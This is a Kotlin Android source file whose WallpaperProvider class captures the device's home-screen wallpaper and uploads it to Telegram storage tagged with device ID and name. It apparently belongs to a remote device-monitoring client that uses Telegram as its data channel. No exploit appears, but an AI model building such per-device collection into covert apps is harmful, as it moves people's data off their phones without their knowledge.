package com.xeg911.appclient.core.device

import android.annotation.SuppressLint
import android.app.WallpaperManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import androidx.core.graphics.createBitmap
import androidx.core.graphics.scale
import com.xeg911.appclient.data.remote.channel.telegram.format.TelegramMessageFactory
import com.xeg911.appclient.data.remote.storage.TelegramStorageUploader
import com.xeg911.appclient.permission.PermissionChecker
import com.xeg911.shared.data.model.WallpaperSnapshot
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Captures the home-screen wallpaper and uploads it to Telegram Storage.
 */
@Singleton
class WallpaperProvider @Inject constructor(
    @param:ApplicationContext private val context: Context,
    private val permissionChecker: PermissionChecker,
    private val telegramStorageUploader: TelegramStorageUploader
) {
    companion object {
        private const val MAX_WIDTH = 1080
        private const val MAX_HEIGHT = 1920
        private const val JPEG_QUALITY = 85
    }

    suspend fun collect(deviceId: String, deviceName: String? = null): WallpaperSnapshot? {
        return withContext(Dispatchers.IO) {
            runCatching {
                val bitmap = captureWallpaperBitmap() ?: return@withContext null
                val scaled = bitmap.scaleDown()
                val bytes = scaled.toJpegBytes()

                // Build a rich HTML caption via TelegramMessageFactory
                val captionMsg = TelegramMessageFactory.buildWallpaperCaption(
                    deviceId = deviceId,
                    widthPx = scaled.width,
                    heightPx = scaled.height,
                    sizeBytes = bytes.size.toLong(),
                    capturedAt = System.currentTimeMillis(),
                    deviceName = deviceName
                )

                val result = telegramStorageUploader.upload(
                    deviceId = deviceId,
                    fileBytes = bytes,
                    fileName = "wallpaper.jpg",
                    mimeType = "image/jpeg",
                    caption = captionMsg.text,
                    captionParseMode = captionMsg.parseMode,
                    replyMarkup = captionMsg.replyMarkup
                ) ?: return@withContext null

                WallpaperSnapshot(
                    telegramFileId = result.fileId,
                    downloadUrl = result.downloadUrl,
                    widthPx = scaled.width,
                    heightPx = scaled.height,
                    sizeBytes = bytes.size.toLong(),
                    capturedAt = System.currentTimeMillis()
                )
            }.getOrNull()
        }
    }

    @SuppressLint("MissingPermission")
    private fun captureWallpaperBitmap(): Bitmap? {
        if (!permissionChecker.canReadWallpaper()) return null

        return try {
            WallpaperManager.getInstance(context).drawable?.toBitmap()
        } catch (_: SecurityException) {
            null
        } catch (_: Exception) {
            null
        }
    }

    private fun Drawable.toBitmap(): Bitmap {
        if (this is BitmapDrawable && bitmap != null) return bitmap
        val w = intrinsicWidth.coerceAtLeast(1)
        val h = intrinsicHeight.coerceAtLeast(1)
        val bmp = createBitmap(w, h)
        val c = Canvas(bmp)
        setBounds(0, 0, c.width, c.height)
        draw(c)
        return bmp
    }

    private fun Bitmap.scaleDown(): Bitmap {
        val ratio = minOf(
            MAX_WIDTH.toFloat() / width,
            MAX_HEIGHT.toFloat() / height,
            1f
        )
        if (ratio >= 1f) return this
        return this.scale(
            (width * ratio).toInt().coerceAtLeast(1),
            (height * ratio).toInt().coerceAtLeast(1)
        )
    }

    private fun Bitmap.toJpegBytes(): ByteArray =
        ByteArrayOutputStream().also {
            compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, it)
        }.toByteArray()
}
